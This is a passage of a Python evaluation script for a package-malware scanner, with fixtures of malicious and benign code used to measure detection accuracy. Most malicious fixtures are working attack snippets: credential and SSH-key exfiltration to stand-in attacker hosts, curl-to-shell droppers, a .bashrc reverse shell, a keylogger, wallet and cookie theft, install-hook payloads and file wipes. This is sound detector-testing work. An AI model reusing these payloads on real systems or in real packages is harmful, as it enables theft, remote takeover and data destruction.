"""
합성 fixture 기반 정량 평가.

목적:
  - 외부 데이터셋/네트워크 의존 없이 코어 매처들의 P/R/F1 측정
  - registry 다운로드 / threat_filter (known_malicious DB) 를 우회하고
    Stage 2 (behavior) → Stage 4C (47-indicator) → Stage 4D (taint slicing)
    → Stage 4E (sequence pattern) → Stage 5 (multi-agent stub) 의
    순수 매처 정확도만 측정

흐름:
  1. 인메모리 fixture (악성 N + 정상 N) 정의
  2. EntryFile/FullSourceFile 인스턴스로 stage 들 직접 호출
  3. verdict 별 분류 → 혼동 행렬 → P/R/F1
  4. JSON + 사람 읽는 표 출력

라벨 의미:
  - "malicious" 라벨: MALICIOUS / HIGH_RISK / SUSPICIOUS 중 하나로 잡혀야 정답
  - "benign"   라벨: CLEAN 으로 잡혀야 정답
"""
from __future__ import annotations

import json
import sys
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional

# src 경로 등록
ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "src"))

from pkgsentinel.schema import (
    AnalysisReport, AttackDimension, Ecosystem, Evidence, LLMVerdict,
    Severity, StageResult, TTPSource, Verdict, empty_report,
)
from pkgsentinel.stages.stage1_entry_point import EntryFile
from pkgsentinel.stages.stage1b_full_source import FullSourceFile
from pkgsentinel.stages.stage2_behavior import _analyze_python, BehaviorReport
from pkgsentinel.stages.stage4_ttp_match import match_ttps
from pkgsentinel.stages.indicator_matcher import match_all as match_47
from pkgsentinel.stages.sequence_patterns import mine as mine_seq
from pkgsentinel.stages.taint_slicer import analyze_python as taint_analyze
from pkgsentinel.stages.stage5_multi_agent import review_multi
from pkgsentinel.knowledge.malicious_indicators import IndicatorCategory


# ─────────────── Fixture ───────────────

@dataclass
class Fixture:
    name: str
    label: str                 # 'malicious' | 'benign'
    description: str
    files: dict[str, str]      # {path: content}
    expected_verdict_set: set  # 정답으로 인정할 verdict 집합
    note: str = ""


def _mal(name, *, expected, note, files, description=""):
    return Fixture(
        name=name, label="malicious", description=description,
        files=files,
        expected_verdict_set={Verdict(v) for v in expected},
        note=note,
    )


def _ben(name, *, files, description="", expected=("CLEAN",)):
    return Fixture(
        name=name, label="benign", description=description,
        files=files,
        expected_verdict_set={Verdict(v) for v in expected},
    )


# ─── 악성 fixtures (10개) ─────────────────────────────────

MAL_FIXTURES: list[Fixture] = [
    _mal(
        "credential-exfil-base64",
        description="env 읽기 → base64 → http.post (event-stream 류)",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="SP-001 + EXF-001",
        files={"setup.py": '''
"""Cred exfil sample"""
import os, base64, requests
def run():
    aws = os.environ.get("AWS_ACCESS_KEY_ID")
    gh  = os.environ.get("GITHUB_TOKEN")
    enc = base64.b64encode((aws + ":" + gh).encode())
    requests.post("https://attacker.example.com/c2", data=enc, verify=False)
'''},
    ),
    _mal(
        "encoded-exec-payload",
        description="base64 디코드 → exec (DEF-005)",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="SP-003 + DEF-005 + EXM-001",
        files={"hooks/postinstall.py": '''
import base64
payload = b"ZXhlYygncm0gLXJmIC8nKQ=="
exec(base64.b64decode(payload).decode())
'''},
    ),
    _mal(
        "shell-curl-bash-pipe",
        description="curl | bash 패턴 (NET-007)",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="EXM-008 + NET-007",
        files={"setup.py": '''
import subprocess
subprocess.run("curl http://attacker.example.com/x.sh | bash", shell=True)
'''},
    ),
    _mal(
        "system-recon-and-send",
        description="시스템 정보 다중 수집 → 송신 (SP-004)",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="SP-004 (recon + exfil)",
        files={"hooks/init.py": '''
import os, platform, socket, requests
data = {
    "user":   os.environ.get("USER"),
    "host":   socket.gethostname(),
    "uname":  platform.uname()._asdict(),
    "path":   os.environ.get("PATH"),
    "home":   os.environ.get("HOME"),
}
requests.post("https://x.example.com/info", json=data)
'''},
    ),
    _mal(
        "subprocess-output-upload",
        description="subprocess.check_output → http.put (taint flow)",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="taint: subprocess → upload",
        files={"agent.py": '''
import subprocess, requests
out = subprocess.check_output(["whoami"])
requests.put("https://x.com/upload", data=out)
'''},
    ),
    _mal(
        "obfuscated-import-exec",
        description="__import__ 난독화 + exec",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="DEF-006 + EXM-001",
        files={"util.py": '''
m = __import__("subprocess")
cmd = "rm -rf /"
m.run(cmd, shell=True)
'''},
    ),
    _mal(
        "discord-webhook-exfil",
        description="discord webhook 으로 secret 송신 (EXF-004)",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="EXF-004",
        files={"setup.py": '''
import os, requests
secret = os.environ.get("AWS_SECRET_ACCESS_KEY")
requests.post(
    "https://discord.com/api/webhooks/123/secret-token",
    json={"content": secret},
    timeout=5,
)
'''},
    ),
    _mal(
        "install-time-shell-execution",
        description="setuptools cmdclass 오버라이드 + install-time shell",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="EXS-002 + EXS-003 + EXM-008",
        files={"setup.py": '''
from setuptools import setup
from setuptools.command.install import install
import subprocess

class CustomInstall(install):
    def run(self):
        subprocess.run("wget http://evil.example.com/payload.sh -O - | sh", shell=True)
        install.run(self)

setup(
    name="evil-pkg",
    version="0.0.1",
    cmdclass={"install": CustomInstall},
)
'''},
    ),
    _mal(
        "ssl-verify-bypass-and-send",
        description="SSL 검증 우회 + 외부 송신 (NET-009)",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="NET-009 + EXF-001",
        files={"client.py": '''
import os, requests, urllib3
urllib3.disable_warnings()
data = {"key": os.environ.get("API_KEY")}
requests.post("https://attacker.example.com/c2",
              json=data, verify=False, timeout=5)
'''},
    ),
    _mal(
        "pickle-loads-untrusted",
        description="pickle.loads on remote download (EXM-005 / DEF-005 변형)",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="pickle RCE",
        files={"loader.py": '''
import pickle, requests
blob = requests.get("https://attacker.example.com/payload.pkl").content
obj = pickle.loads(blob)  # untrusted RCE
obj()
'''},
    ),
    # ─── 악성 fixture 추가 10개 (B 확장) ─────────────────
    _mal(
        "logic-bomb-platform-trigger",
        description="환경 분기 logic bomb (Linux 에서만 발화)",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="env-specific trigger",
        files={"trigger.py": '''
import platform, subprocess, os
if platform.system() == "Linux":
    aws = os.environ.get("AWS_ACCESS_KEY_ID")
    if aws:
        subprocess.run(f"curl -X POST -d {aws} https://attacker.example.com",
                       shell=True)
'''},
    ),
    _mal(
        "logic-bomb-time-trigger",
        description="시간 트리거 logic bomb",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="time-based trigger",
        files={"util.py": '''
import datetime, os, shutil
if datetime.datetime.now() > datetime.datetime(2026, 12, 31):
    shutil.rmtree(os.path.expanduser("~"))
'''},
    ),
    _mal(
        "dropper-binary-download-exec",
        description="binary 다운로드 + chmod + exec (dropper)",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="dropper",
        files={"dropper.py": '''
import os, requests, stat, subprocess
r = requests.get("http://evil.example.com/miner")
with open("/tmp/.cache_x", "wb") as f:
    f.write(r.content)
os.chmod("/tmp/.cache_x", stat.S_IRWXU)
subprocess.Popen(["/tmp/.cache_x"])
'''},
    ),
    _mal(
        "crypto-miner-pattern",
        description="암호화폐 채굴 패턴",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="crypto miner",
        files={"miner.py": '''
import subprocess, urllib.request
# Download miner config
urllib.request.urlretrieve(
    "https://pool.minexmr.com/config.json", "/tmp/cfg.json"
)
subprocess.Popen(
    ["xmrig", "-c", "/tmp/cfg.json", "--background"],
    stdout=subprocess.DEVNULL,
)
'''},
    ),
    _mal(
        "dns-exfiltration",
        description="DNS query 로 데이터 송출 (covert channel)",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="DNS exfil",
        files={"exfil.py": '''
import socket, os, base64
secret = os.environ.get("AWS_SECRET_ACCESS_KEY", "")
encoded = base64.b32encode(secret.encode()).decode().lower()
# 32자씩 split → DNS sub-domain 으로 송출
for chunk in [encoded[i:i+30] for i in range(0, len(encoded), 30)]:
    try:
        socket.gethostbyname(f"{chunk}.attacker.example.com")
    except Exception:
        pass
'''},
    ),
    _mal(
        "self-modifying-code",
        description="자기 자신을 다른 패키지에 주입하는 self-replication",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="worm-style",
        files={"worm.py": '''
import os, glob, shutil
self_path = __file__
# site-packages 의 __init__.py 들에 자기 자신 import 추가
for init in glob.glob("/usr/lib/python3/dist-packages/*/__init__.py"):
    with open(init, "a") as f:
        f.write("\\nimport sys; exec(open(r'%s').read())\\n" % self_path)
'''},
    ),
    _mal(
        "preinstall-script-style",
        description="install hook 안에서 외부 endpoint 호출 + secrets 송신",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="preinstall pattern",
        files={"setup.py": '''
from setuptools import setup
from setuptools.command.develop import develop
import os, requests

class CustomDevelop(develop):
    def run(self):
        try:
            requests.post(
                "https://attacker.example.com/preinstall",
                json={
                    "user":  os.environ.get("USER"),
                    "home":  os.environ.get("HOME"),
                    "cwd":   os.getcwd(),
                    "envs":  list(os.environ.keys()),
                },
                timeout=3,
            )
        except Exception:
            pass
        develop.run(self)

setup(name="evil-dev", cmdclass={"develop": CustomDevelop})
'''},
    ),
    _mal(
        "clipboard-hijack",
        description="클립보드 모니터링 + 암호화폐 주소 swap",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="clipboard hijack",
        files={"hijack.py": '''
import re, time, subprocess

def get_clip():
    return subprocess.check_output(["xclip", "-o"], text=True)

def set_clip(s: str):
    subprocess.run(["xclip", "-i"], input=s, text=True)

while True:
    try:
        c = get_clip()
        # BTC address pattern → 공격자 주소로 swap
        if re.match(r"^[13][a-km-zA-HJ-NP-Z0-9]{25,34}$", c):
            set_clip("1AttackerWalletXXXXXXXXXXXXXXX")
    except Exception:
        pass
    time.sleep(1)
'''},
    ),
    _mal(
        "ssh-key-theft",
        description="SSH 개인키 읽기 + 외부 송신",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="creds-paths + EXF-001",
        files={"helper.py": '''
import os, requests
home = os.path.expanduser("~")
for fname in ("id_rsa", "id_ed25519", ".aws/credentials"):
    p = os.path.join(home, ".ssh" if "id_" in fname else "", fname)
    try:
        with open(p) as f:
            requests.post("https://attacker.example.com/keys",
                          data={"name": fname, "content": f.read()})
    except Exception:
        pass
'''},
    ),
    _mal(
        "variable-alias-obfuscation",
        description="__import__ 결과를 변수에 할당 후 메서드 호출 (alias)",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="alias of obfuscated-import-exec — 변수 추적 한계 알려진 케이스",
        files={"alias.py": '''
import os
m = __import__("subprocess")
n = __import__("os")
secret = n.environ.get("AWS_KEY")
m.run(f"curl -d {secret} https://attacker.example.com", shell=True)
'''},
    ),
    # ─── 악성 fixture 추가 10 (60 fixture 목표) ───────────
    _mal(
        "ld-preload-injection",
        description="LD_PRELOAD 환경변수 덮어쓰기 (Linux 후킹)",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="SYS-001",
        files={"hook.py": '''
import os, subprocess
os.environ["LD_PRELOAD"] = "/tmp/malicious.so"
subprocess.run(["bash", "-c", "echo hooked"])
'''},
    ),
    _mal(
        "bashrc-persistence",
        description=".bashrc 에 reverse shell 추가",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="SYS-002",
        files={"persist.py": '''
import os
home = os.path.expanduser("~")
with open(home + "/.bashrc", "a") as f:
    f.write('\\n(bash -i >& /dev/tcp/attacker.example.com/4444 0>&1) &\\n')
'''},
    ),
    _mal(
        "wallet-exfil",
        description="암호화폐 지갑 파일 읽기 + 송신",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="SYS-003",
        files={"wallet.py": '''
import os, glob, requests
for path in glob.glob(os.path.expanduser("~/.electrum/wallets/*")):
    try:
        with open(path, "rb") as f:
            requests.post("https://attacker.example.com/wallets",
                          files={"w": f.read()})
    except Exception:
        pass
'''},
    ),
    _mal(
        "creationflags-detached",
        description="DETACHED_PROCESS subprocess flag (Windows hidden)",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="EXM-004",
        files={"hide.py": '''
import subprocess
DETACHED_PROCESS = 0x00000008
CREATE_NEW_PROCESS_GROUP = 0x00000200
subprocess.Popen(
    ["powershell.exe", "-c", "echo hidden"],
    creationflags=DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP,
)
'''},
    ),
    _mal(
        "geo-ip-recon-and-send",
        description="ipinfo.io 로 IP/지리 정보 수집 → 송신",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="NET-001 + EXF-001",
        files={"recon.py": '''
import requests, os
geo = requests.get("https://ipinfo.io/json").json()
geo["user"] = os.environ.get("USER")
requests.post("https://attacker.example.com/geo", json=geo)
'''},
    ),
    _mal(
        "tor-onion-c2",
        description=".onion C2 도메인 호출",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="EXF-005 (.onion)",
        files={"c2.py": '''
import requests
requests.post(
    "http://abcd1234efgh5678.onion/checkin",
    json={"id": "victim-001", "status": "alive"},
)
'''},
    ),
    _mal(
        "ctypes-shellcode",
        description="ctypes 로 native binary 로드 + shellcode 실행",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="EXM-003",
        files={"sc.py": '''
import ctypes
shellcode = b"\\x90" * 16 + b"\\xc3"
buf = ctypes.create_string_buffer(shellcode)
fn = ctypes.CFUNCTYPE(None)(ctypes.addressof(buf))
fn()
'''},
    ),
    _mal(
        "pastebin-fetch-exec",
        description="pastebin 에서 페이로드 다운 + exec",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="EXF-005 + EXM-001",
        files={"pb.py": '''
import requests
r = requests.get("https://pastebin.com/raw/AbCdEfGh")
exec(r.text)
'''},
    ),
    _mal(
        "etc-hosts-poison",
        description="/etc/hosts 파일에 fake DNS 추가",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="SYS-009",
        files={"poison.py": '''
with open("/etc/hosts", "a") as f:
    f.write("\\n6.6.6.6 google.com\\n6.6.6.6 github.com\\n")
'''},
    ),
    _mal(
        "credential-paths-multifile",
        description="여러 credential 파일 동시 수집",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="credential-paths + EXF-001",
        files={"creds.py": '''
import os, requests
home = os.path.expanduser("~")
targets = [
    home + "/.aws/credentials",
    home + "/.docker/config.json",
    home + "/.ssh/id_rsa",
    home + "/.netrc",
    home + "/.config/gcloud/credentials.db",
]
collected = {}
for p in targets:
    try:
        with open(p) as f:
            collected[p] = f.read()
    except Exception:
        pass
requests.post("https://attacker.example.com/creds", json=collected)
'''},
    ),
    # ─── 사이클 5: 악성 5 추가 ───────────────────────────
    _mal(
        "discord-token-grabber",
        description="Discord 토큰 탈취 (LocalStorage/leveldb 스캔)",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="실제 사례: PyPI/npm Discord token grabber 다수",
        files={"grabber.py": '''
import os, re, glob, requests

paths = [
    os.path.expandvars(r"%APPDATA%\\\\discord\\\\Local Storage\\\\leveldb"),
    os.path.expanduser("~/.config/discord/Local Storage/leveldb"),
]
TOKEN_RE = re.compile(r"[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}")
tokens = set()
for p in paths:
    for f in glob.glob(p + "/*.ldb") + glob.glob(p + "/*.log"):
        try:
            with open(f, "rb") as fh:
                for m in TOKEN_RE.finditer(fh.read().decode("latin-1")):
                    tokens.add(m.group(0))
        except Exception:
            pass
if tokens:
    requests.post("https://discord.com/api/webhooks/123/abc",
                  json={"content": "\\n".join(tokens)})
'''},
    ),
    _mal(
        "chrome-cookie-stealer",
        description="Chrome SQLite cookies/login 직접 추출",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="실제 사례: 다수 info-stealer 변형",
        files={"chrome.py": '''
import os, sqlite3, shutil, requests
src = os.path.expanduser("~/.config/google-chrome/Default/Cookies")
dst = "/tmp/cookies_copy.db"
shutil.copy(src, dst)  # locked DB 복사
con = sqlite3.connect(dst)
rows = con.execute(
    "SELECT host_key, name, encrypted_value FROM cookies"
).fetchall()
con.close()
requests.post("https://attacker.example.com/cookies",
              json={"rows": [str(r) for r in rows]})
'''},
    ),
    _mal(
        "keylogger-pynput",
        description="키 입력 captured + 외부 송신",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="실제 사례 변형 (pynput 기반)",
        files={"keylog.py": '''
import requests, time
buffer = []

def on_press(key):
    buffer.append(str(key))
    if len(buffer) >= 100:
        try:
            requests.post(
                "https://attacker.example.com/keys",
                json={"keys": buffer.copy(), "ts": time.time()},
            )
        except Exception:
            pass
        buffer.clear()

# pynput 임포트 + 리스너 시작
from pynput import keyboard
listener = keyboard.Listener(on_press=on_press)
listener.start()
'''},
    ),
    _mal(
        "multi-stage-loader",
        description="1차 fetch → exec(2차 코드) → 3차 다운+실행",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="다단계 loader (실제 사례: request typosquat 변형)",
        files={"loader.py": '''
import requests, base64, subprocess
# Stage 1: 외부에서 base64 인코딩된 stage 2 fetch
stage2_b64 = requests.get("https://cdn.attacker.example/s2").text
exec(base64.b64decode(stage2_b64).decode())
# Stage 3: 별도 binary 다운로드 + 실행
r = requests.get("https://cdn.attacker.example/payload.bin")
open("/tmp/.s3", "wb").write(r.content)
subprocess.Popen(["/bin/sh", "-c", "chmod +x /tmp/.s3 && /tmp/.s3 &"])
'''},
    ),
    _mal(
        "anti-vm-detection",
        description="VM/sandbox 환경 검출 후 페이로드 분기",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="anti-analysis 기법",
        files={"sandbox_check.py": '''
import os, subprocess, requests
# VM/sandbox 탐지 — 우회면 정상 동작인 척, 실제 호스트면 페이로드
def is_sandbox():
    try:
        out = subprocess.check_output(
            ["systemd-detect-virt"], stderr=subprocess.DEVNULL
        ).decode().strip()
        return out and out != "none"
    except Exception:
        pass
    return os.path.exists("/proc/scsi/scsi") and \
           "VBOX" in open("/proc/scsi/scsi").read().upper()

if not is_sandbox():
    secret = os.environ.get("AWS_SECRET_ACCESS_KEY", "")
    requests.post(
        "https://attacker.example.com/real",
        json={"creds": secret},
    )
'''},
    ),
    # ─── 사이클 5: 정상 5 추가 ───────────────────────────
    _ben(
        "networkx-graph-ops",
        description="networkx 그래프 알고리즘",
        files={"graph.py": '''
"""Graph algorithm helpers."""
import networkx as nx

def shortest_path(g, src, dst):
    return nx.shortest_path(g, source=src, target=dst)

def degree_distribution(g):
    return [d for _, d in g.degree()]

def connected_components(g):
    return list(nx.connected_components(g))
'''},
    ),
    _ben(
        "boto3-s3-readonly",
        description="boto3 S3 read-only client",
        files={"s3.py": '''
"""Read-only S3 helpers."""
import boto3

def list_objects(bucket: str, prefix: str = ""):
    s3 = boto3.client("s3")
    paginator = s3.get_paginator("list_objects_v2")
    for page in paginator.paginate(Bucket=bucket, Prefix=prefix):
        for obj in page.get("Contents", []):
            yield obj["Key"], obj["Size"]

def get_object_text(bucket: str, key: str) -> str:
    s3 = boto3.client("s3")
    obj = s3.get_object(Bucket=bucket, Key=key)
    return obj["Body"].read().decode("utf-8")
'''},
    ),
    _ben(
        "paramiko-ssh-client",
        description="paramiko SSH client (정상 사용)",
        files={"ssh.py": '''
"""SSH command execution helper."""
import paramiko

def run_remote(host: str, user: str, key_path: str, cmd: str) -> str:
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.RejectPolicy())
    client.connect(host, username=user, key_filename=key_path, timeout=10)
    try:
        stdin, stdout, stderr = client.exec_command(cmd, timeout=30)
        return stdout.read().decode("utf-8")
    finally:
        client.close()
'''},
    ),
    _ben(
        "multiprocessing-pool",
        description="multiprocessing.Pool 병렬 처리",
        files={"par.py": '''
"""CPU-bound parallel processing."""
import multiprocessing as mp

def process_chunk(data: bytes) -> int:
    return sum(data)

def parallel_map(items, fn, workers: int = None):
    workers = workers or mp.cpu_count()
    with mp.Pool(workers) as pool:
        return pool.map(fn, items)
'''},
    ),
    _ben(
        "inspect-introspection",
        description="inspect 모듈 메타프로그래밍",
        files={"intro.py": '''
"""Introspection utilities."""
import inspect

def public_methods(obj) -> list[str]:
    return [
        name for name, _ in inspect.getmembers(obj, inspect.ismethod)
        if not name.startswith("_")
    ]

def signature_str(fn) -> str:
    return f"{fn.__name__}{inspect.signature(fn)}"

def caller_name() -> str | None:
    frame = inspect.currentframe()
    if frame and frame.f_back and frame.f_back.f_back:
        return frame.f_back.f_back.f_code.co_name
    return None
'''},
    ),
    # ─── 사이클 6: 악성 5 ────────────────────────────────
    _mal(
        "uninstall-time-trigger",
        description="setup.py egg_info hook 으로 install 외 시점 발화",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="EXS-003 변형 (egg_info)",
        files={"setup.py": '''
from setuptools import setup
from setuptools.command.egg_info import egg_info
import requests, os

class CustomEggInfo(egg_info):
    def run(self):
        try:
            requests.post("https://attacker.example.com/egginfo",
                          json={"home": os.path.expanduser("~"),
                                "user": os.environ.get("USER")})
        except Exception:
            pass
        egg_info.run(self)

setup(name="evil", cmdclass={"egg_info": CustomEggInfo})
'''},
    ),
    _mal(
        "build-py-hook-payload",
        description="setup.py 의 build_py 오버라이드로 페이로드",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="EXS-003 (build_py)",
        files={"setup.py": '''
from setuptools import setup
from setuptools.command.build_py import build_py
import subprocess

class EvilBuild(build_py):
    def run(self):
        subprocess.Popen(
            "curl -fsSL http://evil.example.com/loader.sh | sh",
            shell=True,
        )
        build_py.run(self)

setup(name="x", cmdclass={"build_py": EvilBuild})
'''},
    ),
    _mal(
        "dependency-confusion-internal",
        description="회사 내부 패키지명 typosquat (의존성 혼동)",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="dependency confusion + recon",
        files={"setup.py": '''
"""Reconnaissance hook for dep-confusion."""
from setuptools import setup
from setuptools.command.install import install
import os, json, urllib.request

class Recon(install):
    def run(self):
        try:
            payload = {
                "host":   os.uname()[1],
                "cwd":    os.getcwd(),
                "envs":   list(os.environ.keys()),
                "argv":   __import__("sys").argv,
            }
            req = urllib.request.Request(
                "https://attacker.example.com/dc",
                data=json.dumps(payload).encode(),
                headers={"Content-Type": "application/json"},
            )
            urllib.request.urlopen(req, timeout=3).read()
        except Exception:
            pass
        install.run(self)

setup(name="internal-secret-tool", cmdclass={"install": Recon})
'''},
    ),
    _mal(
        "rust-binary-dropper",
        description="네이티브 binary (so/dll) 추출 + ctypes 로 실행",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="EXM-003 (ctypes) + dropper",
        files={"loader.py": '''
import ctypes, os, base64
# pre-bundled 페이로드 (실제 사례에선 wheel 안에 .so 동봉)
SO = base64.b64decode(b"...")  # truncated
path = "/tmp/.payload.so"
with open(path, "wb") as f:
    f.write(SO)
os.chmod(path, 0o755)
lib = ctypes.CDLL(path)
lib.run()
'''},
    ),
    _mal(
        "stratum-mining-protocol",
        description="Stratum 프로토콜로 마이닝 풀 직접 연결",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="NET-003 (mining pool) 변형",
        files={"miner_proto.py": '''
import socket, json
# 마이닝 풀 직접 연결 (xmrpool / minexmr 등)
sock = socket.create_connection(("pool.minexmr.com", 4444))
sock.send(json.dumps({
    "id": 1, "method": "login",
    "params": {"login": "ATTACKER_WALLET", "pass": "x"}
}).encode() + b"\\n")
'''},
    ),
    # ─── 사이클 6: 정상 5 ────────────────────────────────
    _ben(
        "alembic-migrations",
        description="Alembic DB 마이그레이션 환경",
        files={"env.py": '''
"""Alembic migration env."""
from alembic import context
from sqlalchemy import engine_from_config

config = context.config

def run_migrations_online():
    connectable = engine_from_config(
        config.get_section(config.config_ini_section),
        prefix="sqlalchemy.",
    )
    with connectable.connect() as conn:
        context.configure(connection=conn)
        with context.begin_transaction():
            context.run_migrations()

run_migrations_online()
'''},
    ),
    _ben(
        "graphene-relay-node",
        description="Graphene GraphQL Relay node 정의",
        files={"types.py": '''
"""Graphene Relay types."""
import graphene
from graphene import relay

class Book(graphene.ObjectType):
    class Meta:
        interfaces = (relay.Node,)

    title = graphene.String()
    author = graphene.String()

class Query(graphene.ObjectType):
    node = relay.Node.Field()
    book = graphene.Field(Book, id=graphene.ID(required=True))

    def resolve_book(self, info, id):
        return Book(title="Sample", author="Anon")
'''},
    ),
    _ben(
        "click-progress-bar",
        description="Click progressbar (정상 CLI UX)",
        files={"progress.py": '''
"""Progress bar wrapper using click."""
import click
import time

def slow_iter(items):
    with click.progressbar(items, label="Processing") as bar:
        for x in bar:
            time.sleep(0.001)
            yield x

@click.command()
@click.argument("count", type=int)
def main(count):
    list(slow_iter(range(count)))

if __name__ == "__main__":
    main()
'''},
    ),
    _ben(
        "datetime-zoneinfo",
        description="zoneinfo 시간대 변환",
        files={"tz.py": '''
"""Timezone conversion."""
from datetime import datetime
from zoneinfo import ZoneInfo

def to_kst(dt: datetime) -> datetime:
    if dt.tzinfo is None:
        dt = dt.replace(tzinfo=ZoneInfo("UTC"))
    return dt.astimezone(ZoneInfo("Asia/Seoul"))

def utc_now_iso() -> str:
    return datetime.now(ZoneInfo("UTC")).isoformat()
'''},
    ),
    _ben(
        "scipy-statistics",
        description="scipy 통계 함수",
        files={"stats.py": '''
"""Statistical helpers built on scipy."""
import numpy as np
from scipy import stats

def confidence_interval(data, confidence: float = 0.95):
    a = np.array(data)
    n = len(a)
    m = a.mean()
    sem = stats.sem(a)
    h = sem * stats.t.ppf((1 + confidence) / 2, n - 1)
    return m - h, m + h

def t_test(a, b):
    return stats.ttest_ind(a, b, equal_var=False)
'''},
    ),
    # ─── 사이클 7: 악성 5 — 실제 incident 기반 ──────────────
    _mal(
        "event-stream-style-flatmap",
        description="event-stream 2018 스타일 — flatmap-stream 의존성 추가 + base64",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="실제: event-stream incident 패턴 (npm)",
        files={"index.py": '''
import base64, requests
# 의도된 정상 함수 — 그러나 이 안에 base64 디코드 후 exec
HIDDEN = "aW1wb3J0IHJlcXVlc3RzCnJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vYXR0YWNrZXIuZXhhbXBsZS5jb20vJyk="

def map_stream(data):
    payload = base64.b64decode(HIDDEN).decode()
    exec(payload, {"requests": requests})
    return [x for x in data]
'''},
    ),
    _mal(
        "ua-parser-style-postinstall",
        description="ua-parser-js 2021 — postinstall 에서 cred + miner 다운로드",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="실제: ua-parser-js incident 패턴",
        files={"setup.py": '''
from setuptools import setup
from setuptools.command.install import install
import os, subprocess

class PostInstall(install):
    def run(self):
        install.run(self)
        # creds 수집
        try:
            with open(os.path.expanduser("~/.aws/credentials")) as f:
                subprocess.run(["curl", "-X", "POST", "-d", f.read(),
                                "https://attacker.example.com/c"])
        except Exception:
            pass
        # miner 다운+실행
        subprocess.Popen(
            ["bash", "-c",
             "wget -q http://evil.example.com/miner -O /tmp/.x && "
             "chmod +x /tmp/.x && /tmp/.x &"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )

setup(cmdclass={"install": PostInstall})
'''},
    ),
    _mal(
        "colors-style-infinite-output",
        description="colors.js 2022 — 무한 stdout flood (자기파괴)",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="실제: colors / faker 자살 폭탄",
        files={"sabotage.py": '''
import sys
# 무한 출력 — CI/터미널 마비
while True:
    sys.stdout.write("LIBERTY LIBERTY LIBERTY ")
    sys.stdout.flush()
'''},
    ),
    _mal(
        "node-ipc-style-geo-bomb",
        description="node-ipc 2022 — 특정 국가 IP 에서만 파일 wipe",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="실제: node-ipc protestware",
        files={"check.py": '''
import requests, os, shutil
geo = requests.get("https://ipinfo.io/json").json()
if geo.get("country") in ("RU", "BY"):
    home = os.path.expanduser("~")
    for d in ("Documents", "Desktop", "Pictures"):
        try:
            shutil.rmtree(os.path.join(home, d))
        except Exception:
            pass
'''},
    ),
    _mal(
        "xz-style-gated-payload",
        description="xz-utils 2024 스타일 — 환경 검사 후 native lib 후킹",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="실제: xz utils backdoor 변형 (정적 검출 가능 영역만)",
        files={"hook.py": '''
import os, ctypes
# 특정 환경에서만 발화: linux + sshd 프로세스 컨텍스트
if os.uname().sysname == "Linux" and "sshd" in os.environ.get("_", ""):
    lib = ctypes.CDLL("/usr/lib/x86_64-linux-gnu/liblzma.so.5")
    # 후킹된 함수 호출 — RSA 우회 페이로드 (시뮬레이션)
    if hasattr(lib, "lzma_crc64"):
        lib.lzma_crc64(b"backdoor-trigger", 16, 0)
'''},
    ),
